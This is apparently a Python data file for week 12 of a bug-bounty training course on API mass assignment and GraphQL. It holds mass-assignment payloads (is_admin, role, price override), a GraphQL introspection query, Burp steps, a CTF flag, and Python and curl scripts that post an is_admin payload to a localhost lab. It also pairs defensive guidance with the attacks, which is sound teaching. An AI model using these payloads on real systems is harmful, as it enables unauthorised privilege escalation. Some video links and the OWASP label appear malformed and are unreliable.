WEEK_12_DATA = {
    "week_number": 12,
    "title": "API Hacking, Mass Assignment, & Final Portfolio Consolidation",
    "short_desc": "Exploit API Mass Assignment, excessive data exposure, REST/GraphQL flaws, and consolidate portfolio achievements.",
    "flag": "FLAG{api_mass_assignment_portfolio_complete_9901}",

    "analogy": """API Mass Assignment is like filling out an application form for a library card that only asks for your Name and Address. However, on the printed form, you manually write in an extra line: 'Is_Admin: True'. Because the library clerk scans the paper into the computer database automatically without checking what fields were allowed on the form, the computer grants you head librarian privileges!""",

    "overview": """API Mass Assignment (also known as Auto-Binding or Object Injection) occurs when modern web frameworks (such as Django REST Framework, Ruby on Rails, Express, Spring Boot) automatically bind incoming HTTP client parameters (JSON or form body) to internal database model attributes without filtering allowed properties. Attackers inject unexpected fields like `{"is_admin": true}`, `{"role": "superuser"}`, or `{"price": 0.00}` to elevate privileges or bypass business logic controls.""",

    "learning_objectives": [
        "Audit REST and GraphQL endpoints for Mass Assignment vulnerabilities.",
        "Detect Excessive Data Exposure in JSON response payloads.",
        "Perform GraphQL introspection queries and bypass rate-limiting with batching.",
        "Consolidate 12 weeks of technical research logs into GitHub repositories and LinkedIn milestone exports."
    ],

    "hunters_perspective": """API Mass Assignment is a high-yield bug in modern single-page and mobile API endpoints. Hunters inspect registration forms, profile update calls, and billing endpoints. When updating a profile (`POST /api/user/profile`), hunters inspect GET response bodies to identify hidden model fields (e.g., `role`, `is_verified`, `account_balance`, `is_admin`), add those fields to their POST request JSON, and verify if the backend updates internal state.""",

    "root_cause": """The root cause is un-whitelisted model auto-binding. In frameworks like Django REST Framework or Rails, using `fields = '__all__'` in serializers or calling `User.update(params)` without specifying `permit(:username, :email)` allows client inputs to populate any internal model attribute.""",

    "code_audit_manual": """Code Review Manual for API Mass Assignment & GraphQL:
1. Search code for model serializer definitions: ensure explicit field whitelists are defined (`fields = ['username', 'email']`) instead of `__all__`.
2. Inspect GraphQL schema definitions for overly permissive mutation inputs.
3. Check GraphQL introspection settings: disable introspection queries (`schema.introspect = False`) in production builds.
4. Verify HTTP method override parameters (`X-HTTP-Method-Override`).""",

    "payload_logic": {
        "explanation": "Mass Assignment payloads involve inserting administrative model fields into JSON request bodies during account updates.",
        "payloads": [
            "User Profile Escalation: {\"username\":\"john\",\"email\":\"john@test.com\",\"is_admin\":true}",
            "Role Modification: {\"role\":\"administrator\",\"account_type\":\"vip\"}",
            "Price Overriding in Checkout: {\"item_id\":101,\"quantity\":1,\"price\":0.01}",
            "GraphQL Introspection Query: {\"query\":\"{__schema{types{name,fields{name}}}}\"}"
        ]
    },

    "burp_suite_masterclass": """Burp Suite API Hacking Masterclass:
1. REST API Mapping: Intercept API traffic and view JSON responses in Burp Proxy.
2. Field Discovery via Kiterunner / Intruder: Use SecLists `Discovery/Web-Content/api-params.txt` to discover unlinked JSON keys.
3. GraphQL Visualizer / InQL Extension: Install 'InQL' from Burp BApp Store. Import GraphQL endpoint `/graphql` to visualize full schema and auto-generate queries and mutations.
4. Mass Assignment Test: Add `"is_admin": true` or `"verified": true` to user settings JSON payload in Repeater and check if updated user state reflects in response.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Perform GraphQL introspection, locate hidden `updateUserRole` mutation or Mass Assignment parameter in REST account update, elevate privilege to superuser, generate automated portfolio reports, push research logs to GitHub.",
        "blue_team": "Defensive Posture: Implement Data Transfer Objects (DTOs) and strict input whitelisting. Use explicitly defined Django serializers. Disable GraphQL introspection in production environments. Enforce rate-limiting on API endpoints."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - API Security & Mass Assignment",
        "portswigger_url": "https://portswigger.net/web-security/api-testing",
        "owasp_title": "OWASP API Security Top 10 - API6:2023 Server-Side Parameter Pollution / Mass Assignment",
        "owasp_url": "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 14: Attacking Web Services & APIs (pp. 533-575)",
            "sub_chapter": "14.2 REST & SOAP API Flaws",
            "analysis": "Stuttard & Pinto present the fundamentals of API security, parameter pollution, auto-binding, and web service vulnerabilities."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 15: API Hacking & GraphQL (pp. 281-305)",
            "sub_chapter": "15.3 Exploiting Mass Assignment & GraphQL Introspection",
            "analysis": "Vickie Li demonstrates finding Mass Assignment in modern REST frameworks and analyzing GraphQL schemas."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 12: API Security Disclosures (pp. 261-285)",
            "sub_chapter": "12.2 Mass Assignment Account Takeovers",
            "analysis": "Peter Yaworski reviews real-world bug bounty reports where Mass Assignment allowed instant administrative privilege escalation."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 13: API Fuzzing & Schema Generation (pp. 241-260)",
            "sub_chapter": "13.1 Generating OpenAPI / Swagger Specs with AI",
            "analysis": "Barbosa demonstrates using AI prompts to analyze API parameters and reconstruct Swagger definitions."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 14: Portfolio Consolidation & VDP Mastery (pp. 316-340)",
            "sub_chapter": "14.1 Building a Professional Bug Bounty Portfolio",
            "analysis": "Vazquez & Javier walk through organizing research logs, documenting PoCs, and writing high-yield VDP reports."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 18: Working with APIs & JSON (pp. 415-440)",
            "sub_chapter": "18.5 Parsing Complex JSON Data Trees",
            "analysis": "Sweigart details Python json library methods for parsing and manipulating API responses."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 10: Building Custom API Attack Libraries (pp. 193-214)",
            "sub_chapter": "10.2 Automated GraphQL & REST Fuzzer",
            "analysis": "Seitz demonstrates building Python scripts to fuzz API endpoints and test for Mass Assignment."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "API Hacking Complete Course: Mass Assignment & GraphQL",
            "youtube_url": "https://www.youtube.com/watch?v=2-5-u0i-H-5",
            "analysis_text": "David Bombal walks through REST API security, GraphQL introspection, and exploiting Mass Assignment."
        },
        {
            "creator": "Vickie Li",
            "title": "API Mass Assignment & Auto-Binding Vulnerabilities Explained",
            "youtube_url": "https://www.youtube.com/watch?v=4-s5e5c7W-5",
            "analysis_text": "Vickie Li demonstrates identifying hidden model attributes in JSON endpoints and elevating account privileges."
        },
        {
            "creator": "Ryan John",
            "title": "GraphQL Hacking & InQL Extension Masterclass",
            "youtube_url": "https://www.youtube.com/watch?v=8-v3u-4-W-9",
            "analysis_text": "Ryan John presents a complete guide to visualizing GraphQL schemas using InQL and exploiting mass assignment."
        },
        {
            "creator": "John Hammond",
            "title": "API Security Auditing & Final Bug Bounty Portfolio Setup",
            "youtube_url": "https://www.youtube.com/watch?v=9-w3u-5-X-0",
            "analysis_text": "John Hammond performs a live demonstration auditing REST APIs, capturing flags, and consolidating security research."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "GitHub Bug Bounty Program",
                "title": "Mass Assignment Flaw Allows Admin Privilege Escalation on User Profile",
                "bounty": "$10,000",
                "summary": "A researcher injected `\"is_admin\": true` into a profile update JSON POST request, enabling administrative privileges."
            },
            {
                "target": "GitLab VDP",
                "title": "GraphQL Mass Assignment in Project Settings Mutation",
                "bounty": "$5,000",
                "summary": "Analyst manipulated GraphQL mutation parameters to modify protected project settings."
            }
        ],
        "programs": [
            {
                "name": "GitHub Bug Bounty Program",
                "platform": "HackerOne",
                "scope": "*.github.com",
                "beginner_friendly": True
            },
            {
                "name": "GitLab Bug Bounty Program",
                "platform": "HackerOne",
                "scope": "*.gitlab.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for API Mass Assignment: Supply JSON request and response pair: 'Analyze this REST API request body and response JSON. Identify potential un-whitelisted model parameters (e.g. role, admin, status) and construct a modified JSON payload to test Mass Assignment: [INSERT JSON]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Inspect POST `/api/user/settings` body `{\"name\":\"John\"}`. Add `\"is_admin\": true` to elevate privileges and unlock Week 12 completion.",
            "guided_step": "Step 1: Submit POST request to `/lab-playground/week-12/target/` with JSON `{\"name\":\"John\",\"is_admin\": true}`.\nStep 2: Inspect returned response for admin flag.\nStep 3: Extract Flag: FLAG{api_mass_assignment_portfolio_complete_9901}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-12/target/`. Intercept API settings calls, execute Mass Assignment parameter injection, and extract the final mastery flag."
        }
    },

    "automation_scripts": {
        "python_script": r"""# Python API Mass Assignment Exploiter (exploit_week12.py)
import requests
import sys

def test_mass_assignment(target_url):
    print(f"[*] Testing API Mass Assignment on: {target_url}")
    payload = {
        "username": "student_hunter",
        "email": "student@mastery.academy",
        "is_admin": True,
        "role": "administrator"
    }
    res = requests.post(target_url, json=payload)
    print(f"[*] Response Code: {res.status_code}")
    print(f"[*] Response Body: {res.text}")
    if "FLAG{" in res.text:
        print(f"[!] SUCCESS: Final Mastery Flag Discovered!")
        print(f"    - Flag: {res.text.strip()}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-12/target/"
    test_mass_assignment(target)
""",
        "bash_script": """#!/bin/bash
# Bash API Mass Assignment Test Harness (recon_week12.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-12/target/"

echo "[*] Sending Mass Assignment JSON payload to $TARGET_URL"
curl -s -X POST -H "Content-Type: application/json" -d '{"username":"hunter","is_admin":true}' "$TARGET_URL" | grep -i "FLAG{"
"""
    }
}
